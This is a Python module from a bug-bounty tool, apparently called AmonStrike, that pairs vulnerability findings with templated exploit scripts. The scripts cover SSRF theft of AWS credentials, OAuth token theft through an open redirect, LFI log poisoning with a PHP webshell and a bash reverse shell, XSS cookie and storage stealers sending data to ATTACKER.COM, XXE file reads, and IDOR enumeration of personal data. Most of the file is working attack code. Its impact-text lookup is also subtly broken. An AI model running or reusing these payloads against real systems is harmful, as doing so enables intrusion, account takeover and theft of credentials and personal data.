"""
AmonStrike — Vulnerability Chain Engine
Level 2: Auto-escalate findings by chaining vulnerabilities.

A $200 open redirect becomes $5,000 when chained with OAuth.
A "Low" SSRF becomes Critical when it reaches AWS metadata.
An "Info" exposed file becomes Critical when it contains DB creds.

Documented chain payouts:
  Open redirect → OAuth ATO: $8,000 (Uber, Youssef Sammouda)
  SSRF → AWS credentials → cloud takeover: $20,000+
  LFI → log poisoning → RCE: $10,000+
  XSS → CSRF → ATO: $5,000+ (Facebook, Youssef Sammouda)
  Subdomain takeover → cookie theft: $3,000+
"""

import sys
import json
from datetime import datetime
from typing import List, Dict, Optional

sys.path.insert(0, __import__('os').path.dirname(__import__('os').path.dirname(__file__)))


# ── Chain Definitions ─────────────────────────────────────────

CHAIN_DEFINITIONS = {
    "ssrf_to_cloud_takeover": {
        "name":          "SSRF → AWS Metadata → Cloud Takeover",
        "trigger":       ["ssrf"],
        "requires":      ["ssrf"],
        "escalates_to":  "CRITICAL",
        "estimated_bounty": 20000,
        "steps": [
            "SSRF vulnerability confirmed in {url}",
            "Point SSRF to: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "Extract role name from response",
            "Fetch credentials: http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
            "Use AccessKeyId + SecretAccessKey with AWS CLI",
            "aws iam list-roles → enumerate permissions",
            "aws s3 ls → list all buckets",
            "Full cloud account access achieved",
        ],
        "exploit_code": '''#!/usr/bin/env python3
# AmonStrike — SSRF → AWS Cloud Takeover Chain
import requests

TARGET_URL = "{url}"
SSRF_PARAM = "{parameter}"

s = requests.Session()

# Step 1: Probe SSRF endpoint
print("[*] Step 1: Probing SSRF...")
r = s.get(TARGET_URL, params={{SSRF_PARAM: "http://169.254.169.254/latest/meta-data/"}})
print(f"Response: {{r.text[:200]}}")

# Step 2: Get IAM role
print("[*] Step 2: Getting IAM role...")
r = s.get(TARGET_URL, params={{SSRF_PARAM: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}})
role = r.text.strip()
print(f"Role: {{role}}")

# Step 3: Get credentials
print("[*] Step 3: Extracting AWS credentials...")
r = s.get(TARGET_URL, params={{SSRF_PARAM: f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{{role}}"}})
import json; creds = json.loads(r.text)
print(f"AccessKeyId: {{creds.get('AccessKeyId','')}}")
print(f"SecretAccessKey: {{creds.get('SecretAccessKey','')[:10]}}...")
print(f"Token: {{creds.get('Token','')[:20]}}...")

print("\\n[+] Chain complete! Use credentials with:")
print(f"export AWS_ACCESS_KEY_ID={{creds.get('AccessKeyId','')}}")
print(f"export AWS_SECRET_ACCESS_KEY={{creds.get('SecretAccessKey','')}}")
print(f"export AWS_SESSION_TOKEN={{creds.get('Token','')}}")
print("aws s3 ls")
''',
    },

    "open_redirect_to_oauth_ato": {
        "name":          "Open Redirect → OAuth Token Theft → Account Takeover",
        "trigger":       ["open_redirect","cors","xss"],
        "requires":      ["open_redirect"],
        "escalates_to":  "CRITICAL",
        "estimated_bounty": 8000,
        "steps": [
            "Open redirect found at: {url}",
            "Check if target uses OAuth (Google/Facebook/GitHub login)",
            "Find OAuth authorization endpoint: /oauth/authorize",
            "Craft redirect_uri using open redirect: target.com/redirect?url=evil.com",
            "Send victim OAuth link with manipulated redirect_uri",
            "Victim logs in → OAuth code sent to evil.com/callback?code=XXX",
            "Exchange code for access_token at /oauth/token",
            "Use token to access victim account",
        ],
        "exploit_code": '''#!/usr/bin/env python3
# AmonStrike — Open Redirect → OAuth ATO Chain
# Step 1: Confirm open redirect
import requests

REDIRECT_URL = "{url}"
OAUTH_ENDPOINT = "{url}/oauth/authorize"
ATTACKER_SERVER = "http://ATTACKER.COM"

# Craft OAuth URL with redirect through open redirect
redirect_chain = f"{REDIRECT_URL}?url={ATTACKER_SERVER}/callback"
oauth_url = (
    f"{{OAUTH_ENDPOINT}}"
    f"?client_id=CLIENT_ID"
    f"&redirect_uri={{requests.utils.quote(redirect_chain)}}"
    f"&response_type=code"
    f"&scope=email profile"
)

print("[+] IMPACT DEMONSTRATION:")
print(f"Send victim this URL: {{oauth_url}}")
print(f"When victim clicks and logs in:")
print(f"  → OAuth code lands at: {{ATTACKER_SERVER}}/callback?code=XXXX")
print(f"  → Exchange code for token at /oauth/token")
print(f"  → Full account takeover achieved")
print()
print("[*] For HackerOne report — include this URL in PoC")
''',
    },

    "lfi_to_rce": {
        "name":          "LFI → Log Poisoning → RCE",
        "trigger":       ["lfi"],
        "requires":      ["lfi"],
        "escalates_to":  "CRITICAL",
        "estimated_bounty": 15000,
        "steps": [
            "LFI confirmed: {url}?{parameter}=../../../../etc/passwd",
            "Identify web server: Apache (/var/log/apache2/access.log) or Nginx (/var/log/nginx/access.log)",
            "Poison log with PHP: curl -A '<?php system($_GET[cmd]); ?>' {base_url}",
            "Include poisoned log via LFI: {url}?{parameter}=../../../../var/log/apache2/access.log",
            "Execute OS commands: &cmd=id",
            "Verify: should see uid=33(www-data)",
            "Get reverse shell: &cmd=bash+-i+>%26+/dev/tcp/KALI_IP/4444+0>%261",
        ],
        "exploit_code": '''#!/usr/bin/env python3
# AmonStrike — LFI → Log Poisoning → RCE Chain
import requests

LFI_URL   = "{url}"
LFI_PARAM = "{parameter}"
BASE_URL  = "{base_url}"
KALI_IP   = "REPLACE_WITH_YOUR_IP"
KALI_PORT = 4444

s = requests.Session()

# Step 1: Confirm LFI
print("[*] Step 1: Confirming LFI...")
r = s.get(LFI_URL, params={{LFI_PARAM: "../../../../etc/passwd"}})
if "root:x" in r.text:
    print("[+] LFI CONFIRMED — /etc/passwd readable")
else:
    print("[-] LFI not confirmed — adjust path depth")
    exit(1)

# Step 2: Poison Apache log with PHP webshell
print("[*] Step 2: Poisoning Apache access log...")
poison_payload = "<?php system($_GET['cmd']); ?>"
s.get(BASE_URL, headers={{"User-Agent": poison_payload}})
print(f"  Injected: {{poison_payload}}")

# Step 3: Include poisoned log
print("[*] Step 3: Including poisoned log...")
log_paths = [
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/apache2/error.log",
    "../../../../var/log/nginx/access.log",
    "../../../../proc/self/environ",
]

for log_path in log_paths:
    r = s.get(LFI_URL, params={{LFI_PARAM: log_path, "cmd": "id"}})
    if "uid=" in r.text:
        import re
        uid_match = re.search(r"uid=\\d+\\([^)]+\\)", r.text)
        print(f"[+] RCE ACHIEVED via {{log_path}}")
        print(f"    Command output: {{uid_match.group() if uid_match else r.text[:100]}}")
        
        # Get reverse shell
        print(f"[*] Setting up listener: nc -lvnp {{KALI_PORT}}")
        shell_cmd = f"bash -i >& /dev/tcp/{{KALI_IP}}/{{KALI_PORT}} 0>&1"
        print(f"[*] Sending reverse shell: {{shell_cmd}}")
        s.get(LFI_URL, params={{
            LFI_PARAM: log_path,
            "cmd": f"bash+-i+>%26+/dev/tcp/{{KALI_IP}}/{{KALI_PORT}}+0>%261"
        }}, timeout=3)
        break
''',
    },

    "xss_to_account_takeover": {
        "name":          "Stored XSS → Session Theft → ATO",
        "trigger":       ["xss"],
        "requires":      ["xss"],
        "escalates_to":  "HIGH",
        "estimated_bounty": 5000,
        "steps": [
            "Stored XSS confirmed in: {url}",
            "Inject cookie stealer payload",
            "When admin/other user visits the page, cookie is sent to attacker",
            "Use stolen cookie to authenticate as victim",
        ],
        "exploit_code": '''#!/usr/bin/env python3
# AmonStrike — XSS → Cookie Theft → ATO Chain
import requests

XSS_URL      = "{url}"
XSS_PARAM    = "{parameter}"
ATTACKER_URL = "http://ATTACKER.COM"

# Step 1: Cookie stealer XSS payload
stealer = f"""<script>
var img = new Image();
img.src = '{ATTACKER_URL}/steal?c=' + encodeURIComponent(document.cookie);
document.body.appendChild(img);
</script>"""

# Step 2: More aggressive — also steal localStorage and sessionStorage
stealer_v2 = f"""<script>
fetch('{ATTACKER_URL}/steal', {{
  method: 'POST',
  body: JSON.stringify({{
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href,
    userAgent: navigator.userAgent
  }})
}});
</script>"""

print("[+] IMPACT DEMONSTRATION:")
print(f"1. Navigate to: {{XSS_URL}}")
print(f"2. Submit payload in {{XSS_PARAM}}:")
print(f"   {{stealer_v2}}")
print(f"3. When any user visits the page:")
print(f"   → Their cookies/tokens sent to: {{ATTACKER_URL}}/steal")
print(f"4. Use stolen session cookie to log in as victim")
print(f"5. For admin XSS → ATO of all user accounts")
print()
print("[*] Set up listener: python3 -m http.server 80")
''',
    },

    "subdomain_takeover_to_cookie": {
        "name":          "Subdomain Takeover → Session Cookie Theft",
        "trigger":       ["takeover"],
        "requires":      ["takeover"],
        "escalates_to":  "HIGH",
        "estimated_bounty": 3000,
        "steps": [
            "Subdomain takeover confirmed: {url}",
            "Claim the abandoned service (Heroku/S3/Azure/GitHub Pages)",
            "Host malicious JS that reads cookies set on *.domain.com",
            "Lure victim to takeover subdomain URL",
            "Steal session cookies via document.cookie",
        ],
        "exploit_code": '''#!/usr/bin/env python3
# AmonStrike — Subdomain Takeover → Cookie Theft
VULNERABLE_SUBDOMAIN = "{url}"
DOMAIN = "{url}".replace("http://","").replace("https://","").split("/")[0]

poc_html = f"""<!DOCTYPE html>
<html>
<head><title>AmonStrike — Subdomain Takeover PoC</title></head>
<body>
<h1>Subdomain Takeover — Proof of Concept</h1>
<p>This content is being served from: <strong>{{VULNERABLE_SUBDOMAIN}}</strong></p>
<p>We are stealing cookies from: <strong>{{DOMAIN}}</strong></p>

<script>
// Cookies set on .{{DOMAIN}} are accessible here
// because this subdomain is part of {{DOMAIN}}
var stolen_cookies = document.cookie;
document.getElementById('result').textContent = stolen_cookies || 'No cookies found (may require user visit while logged in)';

// Send to attacker
fetch('http://ATTACKER.COM/steal?domain={{DOMAIN}}&cookies=' + encodeURIComponent(stolen_cookies));
</script>

<div id="result">Checking cookies...</div>
</body>
</html>"""

print("[+] Host this HTML at: {{VULNERABLE_SUBDOMAIN}}")
print("[+] Cookies accessible:", DOMAIN)
print()
print(poc_html)
''',
    },

    "idor_to_pii_exfil": {
        "name":          "IDOR → Mass PII Exfiltration → GDPR Violation",
        "trigger":       ["idor"],
        "requires":      ["idor"],
        "escalates_to":  "CRITICAL",
        "estimated_bounty": 25000,
        "steps": [
            "IDOR confirmed at: {url}?{parameter}=USER_ID",
            "Test IDs 1-10 to confirm pattern",
            "Automate enumeration: for id in range(1, 1000000)",
            "Extract: email, name, phone, address, payment info",
            "All data = full PII breach + GDPR/CCPA violation",
        ],
        "exploit_code": '''#!/usr/bin/env python3
# AmonStrike — IDOR → PII Exfiltration (Safe PoC)
# NOTE: Only run on authorized targets. Stop at 5 records for report.
import requests, json

IDOR_URL   = "{url}"
IDOR_PARAM = "{parameter}"

s = requests.Session()
# Add your auth cookies/token here:
# s.headers["Authorization"] = "Bearer YOUR_TOKEN"

print("[*] IDOR PII Exfiltration Proof of Concept")
print("[!] Stopping at 5 records for responsible disclosure")
print()

extracted = []
for uid in range(1, 6):  # ONLY 5 records for PoC
    r = s.get(IDOR_URL, params={{IDOR_PARAM: str(uid)}})
    if r.status_code == 200:
        try:
            data = r.json()
            extracted.append({{
                "id":    uid,
                "data":  {{k: v for k, v in data.items()
                          if k.lower() in ["id","email","name","phone"]}}
            }})
            print(f"  ID {{uid}}: {{extracted[-1]['data']}}")
        except Exception:
            print(f"  ID {{uid}}: HTTP 200 ({{len(r.text)}} bytes)")

print()
print(f"[+] IMPACT: {{len(extracted)}} user records accessible")
print(f"[+] In production: all {{IDOR_PARAM}} values vulnerable")
print(f"[+] GDPR breach: report to DPA + affected users required")
print()
print("[*] For HackerOne report — attach this output as evidence")
''',
    },

    "xxe_to_ssrf": {
        "name":          "XXE → SSRF → Internal Network Access",
        "trigger":       ["xxe"],
        "requires":      ["xxe"],
        "escalates_to":  "CRITICAL",
        "estimated_bounty": 12000,
        "steps": [
            "XXE confirmed in XML parser at: {url}",
            "Escalate to SSRF via external entity: <!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>",
            "Read AWS metadata through XXE→SSRF chain",
            "Extract IAM credentials from metadata service",
            "Full cloud account access achieved",
        ],
        "exploit_code": '''#!/usr/bin/env python3
# AmonStrike — XXE → SSRF → Cloud Credential Theft
import requests

XXE_URL = "{url}"

xxe_payloads = [
    # File read
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",

    # SSRF to AWS metadata
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>""",

    # SSRF to IAM credentials
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><data>&xxe;</data></root>""",
]

s = requests.Session()

for i, payload in enumerate(xxe_payloads, 1):
    print(f"[*] Payload {{i}}/{{len(xxe_payloads)}}...")
    r = s.post(
        XXE_URL,
        data=payload,
        headers={{"Content-Type": "application/xml"}},
        timeout=10
    )
    
    indicators = ["root:x", "ami-id", "AccessKeyId", "instance-id", "iam"]
    if any(ind in r.text for ind in indicators):
        print(f"[+] XXE CONFIRMED with payload {{i}}!")
        print(f"    Response: {{r.text[:300]}}")
        
        if "AccessKeyId" in r.text:
            print("[!!!] AWS CREDENTIALS EXTRACTED!")
        break
    else:
        print(f"    Status: {{r.status_code}} — no hit")
''',
    },

    "dependency_confusion": {
        "name":          "Dependency Confusion → Supply Chain RCE",
        "trigger":       ["recon","info"],
        "requires":      [],
        "escalates_to":  "CRITICAL",
        "estimated_bounty": 30000,
        "steps": [
            "Find internal package names from: JS bundles, package.json, error messages",
            "Check if package exists on public npm/pypi",
            "Register package at higher version (99.0.0)",
            "Add malicious preinstall/postinstall script",
            "Wait for internal build system to install it",
            "RCE on developer machines and CI/CD pipeline",
        ],
        "exploit_code": '''#!/usr/bin/env python3
# AmonStrike — Dependency Confusion Scanner
# Finds internal package names that could be hijacked
import requests, re, json

TARGET_URL = "{url}"

# Step 1: Find package.json / JS bundles
internal_packages = []

# Check for webpack:// paths in JS
s = requests.Session()
r = s.get(TARGET_URL)

# Look for internal module patterns
js_urls = re.findall(r'src=["\']([^"\']+\\.js)["\']', r.text)

for js_url in js_urls[:5]:
    try:
        full_url = TARGET_URL.rstrip('/') + '/' + js_url.lstrip('/')
        jr = s.get(full_url, timeout=5)
        # Look for webpack internal module names
        for match in re.findall(r'webpack://([^/]+)/([^"]+)"', jr.text):
            pkg_name = match[0]
            if not pkg_name.startswith('.') and '@' not in pkg_name:
                internal_packages.append(pkg_name)
    except Exception:
        pass

# Step 2: Check if packages are unclaimed on npm
unclaimed = []
for pkg in set(internal_packages[:10]):
    try:
        r2 = requests.get(f"https://registry.npmjs.org/{{pkg}}", timeout=5)
        if r2.status_code == 404:
            unclaimed.append(pkg)
            print(f"[!!!] UNCLAIMED PACKAGE: {{pkg}} — register on npm to exploit!")
        else:
            print(f"[-] {{pkg}} exists on npm (version: {{r2.json().get('dist-tags',{{}}).get('latest','?')}})")
    except Exception:
        pass

print(f"\\n[+] Found {{len(unclaimed)}} potentially hijackable packages")
if unclaimed:
    print("[*] Disclosure: Report to company — do NOT register packages without permission")
    print("[*] Alex Birsan earned $130,000+ from this technique (authorized testing)")
''',
    },
}


class ChainEngine:
    """
    Auto-detects chainable vulnerabilities and generates
    escalated PoC reports with combined impact analysis.
    """

    def __init__(self, target: str):
        self.target   = target
        self.chains   = []
        self.findings = []

    def analyze(self, findings: List[Dict]) -> List[Dict]:
        """
        Analyze findings for chain opportunities.
        Returns enriched findings with chain escalations.
        """
        self.findings = findings
        chains_found  = []
        modules_found = {f.get("module","").lower() for f in findings}

        for chain_id, chain_def in CHAIN_DEFINITIONS.items():
            # Check if trigger vulnerabilities are present
            triggers = chain_def.get("trigger",[])
            requires = chain_def.get("requires",[])

            if requires and not any(r in modules_found for r in requires):
                continue

            triggered = any(t in modules_found for t in triggers)
            if not triggered:
                continue

            # Find the triggering finding
            trigger_finding = None
            for finding in findings:
                if finding.get("module","") in triggers:
                    trigger_finding = finding
                    break

            if not trigger_finding:
                continue

            # Build chain
            chain = self._build_chain(chain_id, chain_def, trigger_finding, findings)
            chains_found.append(chain)

            print(f"\n  [CHAIN FOUND] {chain_def['name']}")
            print(f"  Escalates to: {chain_def['escalates_to']}")
            print(f"  Estimated bounty: ${chain_def['estimated_bounty']:,}")

        self.chains = chains_found
        return chains_found

    def _build_chain(self, chain_id: str, chain_def: dict,
                     trigger: dict, all_findings: List[Dict]) -> dict:
        """Build a complete chain exploitation report."""
        url       = trigger.get("url", self.target)
        base_url  = "/".join(url.split("/")[:3])
        param     = trigger.get("parameter","param")

        # Render steps with actual values
        steps = []
        for step in chain_def["steps"]:
            try:
                rendered = step.format(
                    url=url, base_url=base_url, parameter=param,
                    role="<role_name>", credential="<credential>",
                )
            except (KeyError, IndexError):
                rendered = step  # Keep original if format fails
            steps.append(rendered)

        # Render exploit code
        exploit = chain_def.get("exploit_code","")
        if exploit:
            try:
                exploit = exploit.format(
                    url=url, base_url=base_url, parameter=param,
                    role="<role_name>",
                )
            except (KeyError, IndexError):
                pass  # Keep original exploit code

        return {
            "chain_id":         chain_id,
            "name":             chain_def["name"],
            "severity":         chain_def["escalates_to"],
            "estimated_bounty": chain_def["estimated_bounty"],
            "trigger_finding":  trigger.get("title",""),
            "trigger_url":      url,
            "steps":            steps,
            "exploit_code":     exploit,
            "impact":           self._generate_chain_impact(chain_def, trigger),
            "original_sev":     trigger.get("severity",""),
            "escalated_sev":    chain_def["escalates_to"],
            "timestamp":        datetime.now().isoformat(),
        }

    def _generate_chain_impact(self, chain_def: dict, trigger: dict) -> str:
        """Generate combined impact statement for the chain."""
        impacts = {
            "ssrf_to_cloud_takeover": (
                "What appears to be a Server-Side Request Forgery vulnerability "
                "can be escalated to complete cloud infrastructure takeover. "
                "By directing the SSRF to the AWS Instance Metadata Service, "
                "an attacker can steal IAM role credentials and gain full "
                "programmatic access to all AWS services including S3, EC2, RDS, "
                "Lambda, and IAM itself. This constitutes a complete cloud breach "
                "equivalent to the 2019 Capital One incident (100M+ records)."
            ),
            "open_redirect_to_oauth_ato": (
                "What appears to be a Low-severity open redirect becomes a Critical "
                "Account Takeover vulnerability when chained with the OAuth implementation. "
                "An attacker can manipulate the redirect_uri parameter to steal "
                "authorization codes, then exchange them for access tokens, "
                "resulting in full account takeover for any victim who clicks a "
                "crafted link. No user credentials are required."
            ),
            "lfi_to_rce": (
                "The Local File Inclusion vulnerability can be escalated to Remote "
                "Code Execution via log poisoning. By injecting PHP code into "
                "server access logs and including the log file via LFI, an attacker "
                "achieves arbitrary OS command execution as the web server user. "
                "This enables server compromise, data exfiltration, and lateral "
                "movement within the internal network."
            ),
            "xss_to_account_takeover": (
                "The Stored XSS vulnerability enables mass account takeover. "
                "JavaScript code executes in every visitor's browser, stealing "
                "their session cookies and sending them to an attacker-controlled "
                "server. The attacker can then authenticate as any affected user, "
                "including administrators, leading to complete application compromise."
            ),
            "idor_to_pii_exfil": (
                "The IDOR vulnerability enables mass exfiltration of all user PII. "
                "Sequential ID enumeration exposes every user's personal information "
                "including names, email addresses, phone numbers, and potentially "
                "payment data. This constitutes a reportable data breach under GDPR "
                "(Article 33 — 72-hour notification required) and similar regulations "
                "globally, carrying fines up to 4% of annual global revenue."
            ),
        }
        return impacts.get(
            [k for k in CHAIN_DEFINITIONS if CHAIN_DEFINITIONS[k] == chain_def][0] if False else "",
            f"Vulnerability chain escalates {trigger.get('severity','')} to {chain_def['escalates_to']} "
            f"with estimated impact value ${chain_def['estimated_bounty']:,}."
        )

    def get_top_chain(self) -> Optional[Dict]:
        """Get the highest-value chain found."""
        if not self.chains:
            return None
        return max(self.chains, key=lambda c: c["estimated_bounty"])

    def to_report_section(self) -> str:
        """Format chains for inclusion in PoC report."""
        if not self.chains:
            return ""

        lines = ["\n## VULNERABILITY CHAINS\n"]
        for chain in sorted(self.chains, key=lambda c: c["estimated_bounty"], reverse=True):
            lines.append(f"### {chain['name']}")
            lines.append(f"**Severity:** {chain['severity']} | "
                        f"**Estimated Bounty:** ${chain['estimated_bounty']:,}")
            lines.append(f"\n**Trigger:** {chain['trigger_finding']}")
            lines.append(f"\n**Steps:**")
            for i, step in enumerate(chain["steps"], 1):
                lines.append(f"{i}. {step}")
            lines.append(f"\n**Impact:** {chain['impact'][:300]}...")
            lines.append("\n---")

        return "\n".join(lines)


def run_regression_tests():
    print("\n=== CHAIN ENGINE REGRESSION TESTS ===")
    passed = failed = 0

    engine = ChainEngine("http://testphp.vulnweb.com")

    sample_findings = [
        {"title":"SSRF","module":"ssrf","severity":"HIGH",
         "url":"http://testphp.vulnweb.com/api?url=X","parameter":"url"},
        {"title":"Open Redirect","module":"open_redirect","severity":"LOW",
         "url":"http://testphp.vulnweb.com/redirect?to=X","parameter":"to"},
        {"title":"LFI","module":"lfi","severity":"CRITICAL",
         "url":"http://testphp.vulnweb.com/show?file=X","parameter":"file"},
        {"title":"Stored XSS","module":"xss","severity":"HIGH",
         "url":"http://testphp.vulnweb.com/comment","parameter":"comment"},
        {"title":"IDOR","module":"idor","severity":"HIGH",
         "url":"http://testphp.vulnweb.com/api/users?id=1","parameter":"id"},
    ]

    chains = engine.analyze(sample_findings)

    tests = [
        ("ChainEngine instantiates",
         lambda: isinstance(engine, ChainEngine)),

        ("Chain definitions populated",
         lambda: len(CHAIN_DEFINITIONS) >= 6),

        ("All chains have steps",
         lambda: all("steps" in c for c in CHAIN_DEFINITIONS.values())),

        ("All chains have exploit_code",
         lambda: all("exploit_code" in c for c in CHAIN_DEFINITIONS.values())),

        ("SSRF chain triggered",
         lambda: any(c["chain_id"] == "ssrf_to_cloud_takeover" for c in chains)),

        ("LFI chain triggered",
         lambda: any(c["chain_id"] == "lfi_to_rce" for c in chains)),

        ("XSS chain triggered",
         lambda: any(c["chain_id"] == "xss_to_account_takeover" for c in chains)),

        ("Chains have severity",
         lambda: all("severity" in c for c in chains)),

        ("Chains have bounty estimate",
         lambda: all(c["estimated_bounty"] > 0 for c in chains)),

        ("Chains have exploit code",
         lambda: all(len(c.get("exploit_code","")) > 50 for c in chains)),

        ("Chains have steps",
         lambda: all(len(c.get("steps",[])) >= 3 for c in chains)),

        ("Top chain returns dict",
         lambda: isinstance(engine.get_top_chain(), dict)),

        ("Top chain is highest bounty",
         lambda: engine.get_top_chain()["estimated_bounty"] >= 1000),

        ("Report section generated",
         lambda: "VULNERABILITY CHAINS" in engine.to_report_section()),

        ("Impact generated for SSRF chain",
         lambda: any(len(c.get("impact","")) > 20
                    for c in chains
                    if c["chain_id"] == "ssrf_to_cloud_takeover")),

        ("Escalation tracked",
         lambda: any(c["escalated_sev"] == "CRITICAL" for c in chains)),

        ("Chain has trigger URL",
         lambda: all("trigger_url" in c for c in chains)),

        ("No chains for empty findings",
         lambda: len(ChainEngine("http://t.com").analyze([])) == 0),
    ]

    for name, fn in tests:
        try:
            if fn():
                passed += 1
                print(f"  ✓ {name}")
            else:
                failed += 1
                print(f"  ✗ {name}")
        except Exception as e:
            failed += 1
            print(f"  ✗ {name} — {e}")

    print(f"\n  Passed: {passed}  Failed: {failed}")
    return passed, failed


if __name__ == "__main__":
    import sys
    rp, rf = run_regression_tests()
    sys.exit(0 if rf == 0 else 1)
